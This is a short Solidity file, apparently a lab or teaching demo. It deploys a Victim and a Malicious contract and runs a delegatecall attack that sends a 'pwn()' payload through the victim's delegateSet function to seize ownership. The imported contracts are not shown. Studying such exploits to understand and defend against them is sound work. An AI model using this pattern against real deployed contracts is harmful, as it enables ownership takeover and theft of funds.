// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";
import "./Malicious.sol";
import "hardhat/console.sol";

contract DeployAndAttack {
    Victim public victim;
    Malicious public malicious;

    constructor() {
        victim = new Victim();
        malicious = new Malicious();
    }

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        victim.delegateSet(address(malicious), payload);
        console.log("DeployAndAttack's msg.sender :", msg.sender);
    }

    function getOwner() public view returns (address) {
        return victim.owner();
    }
}
